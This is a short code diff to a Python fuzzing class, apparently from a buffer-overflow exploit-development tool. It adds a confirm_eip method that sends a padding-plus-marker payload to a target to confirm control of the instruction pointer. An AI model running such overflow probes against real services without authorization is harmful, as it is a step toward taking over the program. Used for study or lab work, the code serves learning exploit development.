@@ -33,3 +33,12 @@ class Fuzz:
         except Exception as e:
             print(str(e))
             print("Program crashed...")
+
+    def confirm_eip(self, offset):
+        s = Send(self.TARGET)
+        payload = "A" * offset + "B" * 4
+        try:
+            s.send_payload(payload)
+        except Exception as e:
+            print(str(e))
+            print("Program crashed...")
